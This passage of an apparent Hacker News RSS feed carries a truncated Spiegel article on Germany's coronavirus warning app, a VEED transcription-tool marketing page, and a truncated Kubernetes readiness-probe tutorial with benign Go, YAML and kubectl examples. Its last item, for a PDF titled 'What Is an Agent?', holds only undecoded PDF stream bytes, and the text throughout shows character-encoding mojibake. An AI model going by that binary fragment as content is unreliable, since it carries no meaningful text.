<p>Inside, five representatives of the German government and two board members from Deutsche Telekom and the software company SAP were on the stage, along with the president of Germany‚Äôs center for disease control, the Robert Koch Institute. They could easily have been mistaken for happy parents after a difficult birth.</p><p>Helga Braun, the head of Angela Merkel‚Äôs Chancellery and a member of her conservative Christian Democratic Union (CDU), said that although it wasn‚Äôt the first, it was perhaps the "best‚Äù corona app available worldwide. Interior Minister Horst Seehofer, likewise of the conservatives, praised the "first class‚Äù experts in the ministries. The CEO of Deutsche Telekom enthused that the app was a "rock star.‚Äù</p>
</div><div>
<p>The only person who seemed to be trying to manage expectations was German Health Minister Jens Spahn of the CDU. The app, he said, is "no panacea.‚Äù The sentence was a bit like the rip cord on a parachute. If expectations are kept low, you won‚Äôt hit the ground as hard if things go wrong.</p><p>That moment of euphoria was almost 100 days ago. Since then, more than 18 million people have downloaded the app, and it has been rated on the Apple and Google app stores with 4.4 and 3.1 out of five stars. The German government, for its part, considers it to be a great success.</p><h3><strong>"One Tool Among Many‚Äù</strong></h3><p>In fact, though, hopes that the virus might be contained using the app have given way to disillusionment. There is no longer any talk of the "very central building block‚Äù of pandemic management, as government spokesman Steffen Seibert described it even before the app‚Äôs launch. It has since become "one tool among many.‚Äù</p>
</div><div>
<p>But what has the app actually achieved? To what extent is it helping contain the pandemic?</p><p>It‚Äôs difficult to issue any kind of interim progress report due to a lack of solid data available. No one can say, for example, exactly how many smartphone users are actively using the app. "We currently assume that figure to be 14 million,‚Äù Deutsche Telekom responded when asked. The German Health Ministry, meanwhile, answered the same question with 17 to 18 million.</p><p>Comments on the internet suggest that many users are annoyed by the app and its strange error messages or confusing warnings. One customer recently asked in the App Store what the new error message "EN_Error‚Äù meant. One developer replied that it was an Apple problem. "Neither a reinstall nor restarting‚Äù the app would help, the developer wrote, but "sometimes the errors go away by themselves.‚Äù</p>
</div><div>
<p>The number of glitches has been painful, particularly because the app was hardly a bargain. It cost the government 15 million euros to develop it, and a further 44.4 million euros have been earmarked for "maintenance and care‚Äù during the operation of the app through 2021. As of August 27, the government had also spent 9.4 million euros advertising the app. "This app deserves your trust,‚Äù Chancellor Angela Merkel ensured her podcast listeners shortly after the launch.</p><p>Despite all the advertising, the numbers of downloads have been growing only slowly for some time now. Every second user now considers the app to be ineffective, as a survey&nbsp;for the initiative D21 and the Technical University of Munich has shown.</p><h3><strong>Further Development Needed</strong></h3><p>Some health and digital experts are urging for the app to be revised as soon as possible before infection rates start to increase even more with the arrival of the cold season in Germany. "The app urgently needs to be further developed in order to make it effective,‚Äù says Karl Lauterbach, the point man for health care policy for the center-left Social Democrats (SPD) and an epidemiologist by training.</p><p>Manuel H√∂ferlin, the point man for digital policy in the parliamentary group of the business-friendly Free Democrats (FDP), is critical of the government for having "rested for too long" following the app‚Äôs successful launch. With the exception of troubleshooting, he says, nothing has happened since then. He says it is "completely incomprehensible‚Äù to him why the app hasn‚Äôt been made available since then for older phone models and in App stores for people under the age of 17, as well.</p><p>The FDP politician also accuses Health Minister Spahn of having sowed confusion among users himself. "At times, he talked about the corona warning app and the data donation app and a quarantine app at the same time, which made many people uncertain and sacrificed important trust,‚Äù he says.</p><p>The truth, though, is that it was Spahn himself who got the app project rolling. It seemed to fit in perfectly with his agenda. When he became health minister two years ago, Spahn told an all-staff meeting at the Health Ministry that digitalization would be one of his core focuses. To back up that commitment, he set up a separate department for digitization, headed by Berlin-based health policy and digital health expert Gottfried Ludewig.</p><p>In the corona crisis, the Warn-App is one of the few measures with which he can stand out, given the federalist ramifications of a health policy system in which much of the responsibility is held by states and local governments. Early on, Spahn pointed to countries like South Korea, which succeeded in using mobile phone data to stop chains of infection. Spahn also saw the app as a way to get out of the lockdown in the long run.</p><p>But Spahn was too brash when it came to the implementation of the project, which unsettled many people. Initially, he wanted to enable the health authorities to request mobile phone cell data from telecommunications providers to trace infection chains. Following fierce protests, including objections from the Justice Ministry, Spahn backed down.</p><p>In the end, he pleaded for risk assessment to be carried out centrally on a server maintained by the Robert Koch Institute to obtain more data for pandemic control. That, in turn, also triggered protests. Hundreds of scientists and experts warned of "unprecedented surveillance.‚Äù</p><h3><strong>A Watered-Down App</strong></h3><p>Ultimately, the German government opted for what is called the decentralized solution - one in which the risk of coronavirus infection is determined by the smartphone itself. Apple and Google had announced that their operating systems would only support decentralized variants anyway.</p><p>Almost overnight, Chancellery Chief of Staff Helge Braun and Spahn commissioned the heads of Deutsche Telekom and SAP to develop that variant. It now meets the requirements of privacy and data protection, but it also weakens the app‚Äôs central task: that of stopping chains of infection early and widely.</p><p>At least that‚Äôs the view taken by Patrick Larscheid. The physician is the head of the public health department in the Berlin district of Reinickendorf. Each day, his team what the app should be able to take care of on its own: They perform contact tracing to warn people who may have been exposed to the coronavirus. They go about their work using traditional means - by interviewing infected persons and then phoning their contacts.</p><p>Theoretically, the app should be able to make such work easier. But Larscheid says that isn't the case and even compares the project with a fiasco in Transport Minister Andreas Scheuer‚Äôs ministry. "The app is Jens Spahn‚Äôs equivalent of (Scheuer‚Äôs) truck toll disaster ‚Äì it cost a lot of money and has no apparent benefit.‚Äù The disaster is a reference to a truck toll technology system that Germany bought but failed to implement, at a cost of hundreds of millions of taxpayer money. "This app does more harm than good,‚Äù he says.</p><p>Larscheid believes the app would have to collect significantly more data to be useful ‚Äì about the place and time of contact and also about the person, for example. "The app doesn‚Äôt even tell you if the alleged risk took place outdoors, on a commuter train or when visiting relatives in a hospital,‚Äù says Larscheid. The app‚Äôs algorithms operate with rough probabilities, he says, which isn't effective enough. "You would never ride in an autonomous vehicle that might or might not hit a tree,‚Äù he says.</p><h3><strong>Diminishing Interest</strong></h3><p>Other critics think the path chosen was the correct one, but that the execution has been less than stellar. "I have the impression that too many people are still only using the Warn-App out of their own interest ‚Äì in other words, in the expectation of being warned themselves, but without the willingness to warn others in turn. But if too many people do that, the app can‚Äôt provide the full effect it was intended to,‚Äù says Anke Domscheit-Berg, the digital policy point person for the Left Party in parliament.</p><p>That refusal could explain one odd statistic. According to Deutsche Telekom, only 3,613 positive test results had been reported via the hotline as of last Tuesday. Even assuming that app users follow the hygiene rules and are less likely to belong to risk groups, that number would be concerningly small if you consider that there have been around 80,000 confirmed new coronavirus infections since the app‚Äôs launch.</p><p>It‚Äôs possible that many infected people aren‚Äôt reporting their positive test results to their app. Or that many of those who downloaded the app in the early days are no longer using it.</p><p>The diminishing interest in the app could also have something to do with the many glitches that have accompanied the project. At first, it didn‚Äôt update automatically in the background on some devices as intended, meaning the app didn‚Äôt warn people reliably for weeks in those instances. It also took quite a while for the people in charge to admit the mistake.</p>
</div><div>
<p>Now, a new glitch is annoying users. If you update your iPhone with the new operating system 13.7, the app might ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1">https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578116</guid>
            <pubDate>Thu, 24 Sep 2020 12:53:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: MP3 to Text]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24578053">thread link</a>) | @sabbakeynejad
<br/>
September 24, 2020 | https://www.veed.io/tools/mp3-to-text#hn | <a href="https://web.archive.org/web/*/https://www.veed.io/tools/mp3-to-text#hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="Intro"><div><div id="w-node-be84c295ef36-ccc0cf0b"><h2><strong>Turn your MP3 into text files, online</strong></h2><p>Do you want to transcribe the speech from your MP3 into a text file? Well, now you can, with VEED! VEED‚Äôs online auto transcription tool is fast, free, and easy to use. Compatible not just with MP3s, but with WAVs, AACs, OGGs, M4As, and even video files - you can convert to text with the click of a button</p></div><p><img alt="" loading="lazy" src="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2.png" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-500.png 500w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-800.png 800w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2.png 1280w"></p></div><div><div id="w-node-be84c295ef39-ccc0cf0b"><h3><strong>MP3 to Text, Online</strong></h3><p>With VEED you can upload your MP3 files in your browser, no software required, and have a text transcription ready in no time</p></div><div id="w-node-be84c295ef3a-ccc0cf0b"><h3><strong>Automatic</strong></h3><p>No longer do you have to sit and listen, typing along to your MP3 files. Now VEED transcribes your MP3s automatically</p></div><div id="w-node-be84c295ef3b-ccc0cf0b"><h3><strong>Fast</strong></h3><p>Our super-fast, cloud-based servers will have your audio files uploaded, transcribed, and converted into text files in a matter of seconds. It‚Äôs so easy!</p></div><div id="w-node-be84c295ef3c-ccc0cf0b"><h3><strong>Edit</strong></h3><p>If you want to change anything, or add a note or comment, just click on a line of transcription and start typing!</p></div><div id="w-node-be84c295ef3d-ccc0cf0b"><h3><strong>Different Languages</strong></h3><p>VEED is able to recognise and transcribe languages from all over the world - English, Spanish, French, Chinese, and many more</p></div><div id="w-node-be84c295ef3e-ccc0cf0b"><h3><strong>Video Transcription</strong></h3><p>You can also upload video files (in multiple formats) and create transcriptions, add subtitles, or download subtitle (.srt) files</p></div></div></div><div id="How-to"><div><h2>How to transcribe MP3 to text:</h2><p>Transcribe your MP3 in 3 easy steps</p></div><div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7b5d102969e0f443e9_cloud.png" loading="lazy" width="32" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9ba6edbc7fd0db328f8f_line.png" loading="lazy" width="2" alt=""></p></div><div><h3><strong>1. Upload</strong></h3><p>Upload your MP3 files to VEED. VEED is all online, no software required</p><p>‚Äç</p></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7a7679911e1f802d1d_scissors.png" loading="lazy" width="32" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9ba6edbc7fd0db328f8f_line.png" loading="lazy" width="2" alt=""></p></div><div><h3><strong>2. Convert to text</strong></h3><p>Under ‚ÄòSubtitles‚Äô, click ‚ÄòAuto Subtitles‚Äô, choose your language, and that‚Äôs it! Your MP3 transcript is generated</p><p>‚Äç</p></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7afbaf558411481ae3_Share.png" loading="lazy" width="32" alt=""></p></div><div><h3><strong>3. Download</strong></h3><p>You can now download in multiple formats - .txt, .vtt, .srt - whatever you need</p></div></div></div><div><div><p><h4>How to use VEED - Make social media video content online</h4><h5>591 views</h5></p></div></div></div><div id="use-cases"><div><h2>Why use our MP3 to Text tool?</h2><p>Turn your MP3s into text files, automatically</p></div><div><div><h3><strong>Quick</strong></h3><p>No need to download any software, you don't even need an account. Get started right away, with our super-fast MP3 to Text tool</p></div><div><h3><strong>Easy</strong></h3><p>You can create transcriptions of your MP3 with a single click, and make line-by-line edits with ease</p></div><div><h3><strong>Versatile</strong></h3><p>You can export your MP3 transcription as a text file, subtitle file, whatever you need</p></div></div></div><div id="testimonials"><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3fcd9f6ea642218575ff6d_quote.png" loading="lazy" width="28" alt=""></p><h2>What they say about <span>VEED</span></h2></div><div><div data-animation="slide" data-duration="500" data-infinite="1"><div><div><div><div><p>Veed is a great piece of browser software with the best team I've ever seen.</p><p>‚Äç</p><p>Veed allows for subtitling, editing, effect/text encoding, and many more advanced features that other editors just can't compete with. The free version is wonderful, but the Pro version is beyond perfect. Keep in mind that this a browser editor we're talking about and the level of quality that Veed allows is stunning and a complete game changer at worst.</p></div><p><strong>Chris Y.</strong></p></div></div><div><div><div><p>I love using VEED&nbsp;as the speech to subtitles transcription is the most accurate I've seen on the market.</p><p>‚Äç</p><p>It has enabled me to edit my videos in just a few minutes and bring my video content to the next level</p></div><p><strong>Laura Haleydt</strong> - Brand Marketing Manager, Carlsberg Importers</p></div></div><div><div><div><p>The Best &amp; Most Easy to Use Simple Video Editing Software!</p><p>‚Äç</p><p>I had tried tons of other online editors on the market and been disappointed. With VEED I haven't experienced any issues with the videos I create on there.</p><p>‚Äç</p><p>It has everything I need in one place such as the progress bar for my 1-minute clips, auto transcriptions for all my video content, and custom fonts for consistency in my visual branding.</p></div><p><strong>Diana B - </strong>Social Media Strategist, Self Employed</p></div></div></div></div></div></div><div id="more-things"><div><div><h2><strong>More than just an MP3 to Text tool</strong></h2><p>VEED is so much more than just an MP3 to Text converter - you can edit and create all kinds of video and audio. Create YouTube video intros, auto-generate subtitles, create Instagram Stories with links and stickers, add sound effects to your audio, join MP3 files together, and so much more!</p></div><p><img src="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1).png" alt="" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-500.png 500w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-800.png 800w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1).png 1600w"></p></div></div></div></div>]]>
            </description>
            <link>https://www.veed.io/tools/mp3-to-text#hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578053</guid>
            <pubDate>Thu, 24 Sep 2020 12:44:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resilient Kubernetes Deployments with Readiness Probes]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577917">thread link</a>) | @rotemtam
<br/>
September 24, 2020 | https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/ | <a href="https://web.archive.org/web/*/https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
  
  <time datetime="2020-09-24T00:00:00+00:00">24 Sep 2020</time>
  <h3 id="introduction">Introduction</h3>

<blockquote><p lang="en" dir="ltr">Let's stop fooling ourselves. What we call CI/CD is actually only CI.</p>‚Äî Ant(on) Weiss (@antweiss) <a href="https://twitter.com/antweiss/status/1308108094157787136?ref_src=twsrc%5Etfw">September 21, 2020</a></blockquote>


<p>Containers make CI much more manageable: reproducible, isolated build environments that create portable and predictable deployment artifacts. Continuously delivering containers to production turns out to be quite a difficult problem which we call collectively <em>container orchestration.</em></p>

<p>What do we need for continuous delivery? An automated and safe way of applying changes to our production environments. In the early days of containers, I once wrote a Node.js server that ssh‚Äôd into a host, updated a docker-compose manifest, and ran a restart command every time a new user signed up for service. (It was automated, but not particularly safe, let me just say)</p>

<p>The first time I heard about Kubernetes was when a team of actually talented engineers inherited my monstrosity and went on to build a proper system that would not crash and burn five times a day. Organizations turn to Kubernetes to facilitate container-based, automated, and safe delivery.</p>

<p>Kubernetes is truly an amazing piece of software, being the brainchild of some <a href="https://k8s.devstats.cncf.io/d/24/overall-project-statistics?orgId=1">10k committers</a> it has grown into a very complete platform for organizations to run containerized applications, with very fine-grained configuration options.  The problem is, that once you have so many options in your hands, some of the permutations that you can roll out can be wrong, or incomplete: failing to set correct configuration options can lead to sub-optimal (or even destructive) behavior of your applications.</p>

<p>Today I want to discuss one feature in the Kubernetes API which I have found to be particularly important to make our applications more resilient in production: <em>readiness probes.</em></p>

<h3 id="our-dummy-application">Our Dummy Application</h3>

<p>For the purpose of this post, we will be exploring different configuration options  of the Kubernetes Deployment API by playing with a tiny webserver example written in Go, this is the baseline:</p>

<div><div><pre><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
	<span>"fmt"</span>
	<span>"log"</span>
	<span>"net/http"</span>
<span>)</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
	<span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
		<span>fmt</span><span>.</span><span>Fprint</span><span>(</span><span>w</span><span>,</span> <span>"Hello, Kubernetes!"</span><span>)</span>
	<span>})</span>
	<span>log</span><span>.</span><span>Fatal</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<p>To build it into a Docker image which we can then deploy to a Kubernetes cluster, we will use this Dockerfile:</p>

<div><div><pre><code><span># build the binary using a normal golang image</span>
<span>FROM</span><span> golang:1.15-buster as build</span>

<span>WORKDIR</span><span> /go/src/app</span>
<span>ADD</span><span> . /go/src/app</span>

<span>RUN </span>go build <span>-o</span> /go/bin/app

<span># then copy the binary distroless image</span>
<span>FROM</span><span> gcr.io/distroless/base-debian10</span>
<span>COPY</span><span> --from=build /go/bin/app /</span>
<span>CMD</span><span> ["/app"]</span>
</code></pre></div></div>

<p>In the above example, we are using a Docker multi-stage build, to first build the server binary in a <code>golang</code> image, and then copy it to a barebones <a href="https://github.com/GoogleContainerTools/distroless">distroless</a> docker image, in order to keep the size of the image minimal and reduce deployment times associated with resource downloads.</p>

<p>To build and push it to Public DockerHub:</p>

<div><div><pre><code>$ docker build -t rotemtam/k8s-deployment-blogpost:baseline .
$ docker push rotemtam/k8s-deployment-blogpost:baseline
</code></pre></div></div>

<h3 id="what-is-the-purpose-of-deployment-objects">What is the purpose of Deployment objects?</h3>

<figure>
    <img src="https://rotemtam.com/assets/deployment-rs-pod.png" alt="Source ">
    <figcaption>Source </figcaption>
  </figure>

<p><small>Source: <a href="http://wiki.ciscolinux.co.uk/index.php?title=Kubernetes/Deployment,_ReplicaSet_and_Pod">wiki.ciscolinux.co.uk</a></small></p>

<p>The Kubernetes designers did a fine job of providing us with an <em>Orthogonal Design</em>, that is, each part of the API is responsible for a specific task, and <em>only it</em> is responsible for that task. This is what the hierarchy looks like:</p>

<ul>
  <li><a href="https://kubernetes.io/docs/concepts/workloads/pods/">Pods</a> are the basic unit of scheduling compute, they are ephemeral and short-lived. They specify how to run a group of containers on a host. It is the Kubernetes control plane‚Äôs responsibility to then schedule this Pod on a specific node and run it.</li>
  <li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/replicaset/">ReplicaSets</a> are simple controllers whose task is to keep maintaining a specific amount of pods of a certain PodSpec up and running on the cluster. If a pod dies, and there is now a gap between the desired state (I want 3 of this thing running) and current state (I now have only 2 of this thing running), it is the ReplicaSet‚Äôs responsibility to schedule a new pod of said spec in its place. A ReplicaSet lives longer than a pod, but it is (usually) pinned to a specific spec the RS lives for the lifetime of a <em>revision</em> of your application.</li>
  <li>A <a href="https://kubernetes.io/docs/concepts/workloads/pods/s">Deployment</a> is a high-level construct that is supposed to live for the entire lifecycle of an application, through many versions and releases. Deployments control how a cluster <em>rolls out</em> a new revision and allow for version <em>rollbacks</em> if needed. So unless you have some very specific orchestration requirements, your interface to scheduling (stateless) applications onto your cluster should be through the Deployment API. (for deploying stateful applications we use a s similar API - <code>StatefulSet</code>)</li>
</ul>

<h3 id="our-baseline-deployment-object">Our baseline Deployment object</h3>

<p>A minimal example for a deployment of our application would be:</p>

<div><div><pre><code><span># declare the object type: </span>
<span>apiVersion</span><span>:</span> <span>apps/v1</span>
<span>kind</span><span>:</span> <span>Deployment</span>

<span># define metadata about our deployment</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>webserver-deployment</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>webserver-deployment</span>

<span># define the spec for our deployment </span>
<span>spec</span><span>:</span>
  <span>replicas</span><span>:</span> <span>3</span>
  <span>selector</span><span>:</span>
    <span>matchLabels</span><span>:</span>
      <span>app</span><span>:</span> <span>webserver-deployment</span>

  <span># define the template for the Pods created by this deployment</span>
  <span>template</span><span>:</span>
    <span>metadata</span><span>:</span>
      <span>labels</span><span>:</span>
        <span>app</span><span>:</span> <span>webserver-deployment</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:baseline</span>
        <span>ports</span><span>:</span>
        <span># expose port 8080</span>
        <span>-</span> <span>containerPort</span><span>:</span> <span>8080</span>
</code></pre></div></div>

<p>To be able to make requests against our app we will expose it with a <code>Service</code> object:</p>

<div><div><pre><code><span># service.yaml:</span>
<span>apiVersion</span><span>:</span> <span>v1</span>
<span>kind</span><span>:</span> <span>Service</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>k8s-blogpost-svc</span>
<span>spec</span><span>:</span>
  <span>selector</span><span>:</span>
    <span>app</span><span>:</span> <span>webserver-deployment</span>
  <span>ports</span><span>:</span>
    <span>-</span> <span>protocol</span><span>:</span> <span>TCP</span>
      <span>port</span><span>:</span> <span>8080</span>
      <span>targetPort</span><span>:</span> <span>8080</span>
</code></pre></div></div>

<p>To test that everything is up and running:</p>

<div><div><pre><code>$ kubectl run curl --image=curlimages/curl --rm --restart=Never -it curl http://k8s-blogpost-svc:8080

Hello, Kubernetes!
</code></pre></div></div>

<p>Hooray!</p>

<h3 id="dealing-with-slow-starting-containers">Dealing with slow starting containers</h3>

<p><img src="https://media.giphy.com/media/3o6MbnqLhX5tJ5wNQQ/giphy.gif" alt="https://media.giphy.com/media/3o6MbnqLhX5tJ5wNQQ/giphy.gif"></p>

<p>Assume that our server needs to perform some initial work before it is ready to serve traffic, perhaps it is downloading some data from storage and processing it into an in-memory data structure which it uses to answer queries. The way Kubernetes works by default is that traffic will be routed to our Pod as soon as the main process in at least one of its containers (not including initContainers) is running. This means that there will be a period of time in which traffic is routed to our Pod without it being able to serve traffic; depending on the <a href="https://kubernetes.io/docs/concepts/services-networking/service/#virtual-ips-and-service-proxies">kube-proxy mode</a> of our clusters, this could result in a spike of 5xx errors whenever a new Pod is scheduled successfully.</p>

<p>To see this in action, let‚Äôs modify our webserver code such that it is slow to start by adding a sleep before starting the webserver:</p>

<div><div><pre><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
	<span>"fmt"</span>
	<span>"log"</span>
	<span>"net/http"</span>
	<span>"time"</span>
<span>)</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
	<span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"Taking a nap.."</span><span>)</span>
	<span>time</span><span>.</span><span>Sleep</span><span>(</span><span>time</span><span>.</span><span>Second</span> <span>*</span> <span>30</span><span>)</span>
	<span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"Ready to serve traffic!"</span><span>)</span>
	<span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
		<span>fmt</span><span>.</span><span>Fprint</span><span>(</span><span>w</span><span>,</span> <span>"Hello, Kubernetes!"</span><span>)</span>
	<span>})</span>
	<span>log</span><span>.</span><span>Fatal</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<p>Building and pushing the new version:</p>

<div><div><pre><code>$ docker build -t rotemtam/k8s-deployment-blogpost:slow-boot .
$ docker push rotemtam/k8s-deployment-blogpost:slow-boot
</code></pre></div></div>

<p>Modifying our deployment yaml to change the docker image:</p>

<div><div><pre><code><span># ... unchanged stuff</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:slow-boot</span>
<span># more unchanged stuff ...</span>
</code></pre></div></div>

<p>If we immediately run our curl command we will see:</p>

<div><div><pre><code><span>$ </span>kubectl run curl <span>--image</span><span>=</span>curlimages/curl <span>--rm</span> <span>--restart</span><span>=</span>Never <span>-it</span> curl http://k8s-blogpost-svc:8080

curl: <span>(</span>7<span>)</span> Failed to connect to k8s-blogpost-svc port 8080: Connection refused
</code></pre></div></div>

<p>How does this happen?</p>

<ol>
  <li>We update the Deployment object with a new PodSpec</li>
  <li>The Deployment creates a new ReplicaSet for the new revision and rolls out the new pods</li>
  <li>As new pods from the new ReplicaSet enter the <code>Ready</code> state, old ones from the existing one are terminated.</li>
  <li>As soon as pods are in a Ready state, they are connected to the <code>k8s-blogpost-svc</code> Service and will get traffic directed to them.</li>
  <li>We make our <code>curl</code> calls from within the cluster and try to connect to port 8080 in our new pods, but they are still asleep waiting for their 30-second nap to end before opening the webserver socket.</li>
  <li>We get a <code>connection refused</code> error message.</li>
</ol>

<p>How do we mitigate this? If we examine the flow of events, it is easy to see that the culprit is on step 4: <em>‚ÄúAs soon as the pods are in ready state‚Äù.</em> Kubernetes thinks our app is <em>ready,</em> (because the container image has downloaded and the process started successfully), when it obviously isn‚Äôt. Surely there must be a way to make Kubernetes aware <em>when</em> it should transition a Pod‚Äôs state to Ready!</p>

<p>Luckily, when we define a deployment‚Äôs PodSpec, we can specify for each container something called a <code>readinessProbe</code>, the docs state it is a ‚ÄúPeriodic probe of container service readiness. Container will be removed from service endpoints if the probe fails‚Äù and that it is of type <a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#probe-v1-core">Probe v1 Core</a>, which  ‚Äúdescribes a health check to be performed against a container to determine whether it is alive or ready to receive traffic.‚Äù</p>

<p>The probe object is quite rich, allowing us to run arbitrary commands in the container, make HTTP requests, and more. In our example, it would be beneficial to make sure the webserver TCP socket is open before we start directing traffic at it. We could do this by changing our deployment to look like:</p>

<div><div><pre><code><span># ... </span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:slow-boot</span>
        <span>ports</span><span>:</span>
        <span># expose port 8080</span>
        <span>-</span> <span>containerPort</span><span>:</span> <span>8080</span>

        <span># wait 30s, then every 5s check if the port is ready</span>
        <span>readinessProbe</span><span>:</span>
          <span>tcpSocket</span><span>:</span>
            <span>port</span><span>:</span> <span>8080</span>
          <span>initia‚Ä¶</span></code></pre></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/">https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/</a></em></p>]]>
            </description>
            <link>https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577917</guid>
            <pubDate>Thu, 24 Sep 2020 12:28:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is an Agent? [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577896">thread link</a>) | @hardmaru
<br/>
September 24, 2020 | http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf | <a href="https://web.archive.org/web/*/http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><f2082c8253a21bcf7efdc822f55d67f3>] &gt;&gt;
stream
x≈ìcbd√†g`b`8	$Àú√ªA,c √Å¬∏√Ñ√ä\	@B¬π
D¬∞‚Äö¬∏√õÔøΩ‚ÄûFÔøΩÀÜÀú√á√Ä√Ñ¬®¬¥¬§≈ΩÔøΩq√®√ôm≈æ
endstream
endobj
                                                                                                                                                                                                                                                                                                         
18 0 obj
&lt;&lt; /Pages 37 0 R /Type /Catalog &gt;&gt;
endobj
19 0 obj
&lt;&lt; /Filter /FlateDecode /S 72 /Length 93 &gt;&gt;
stream
x≈ìc```b``≈æ√Ö√Ä√å√Ä√Äq≈íAÀÜ
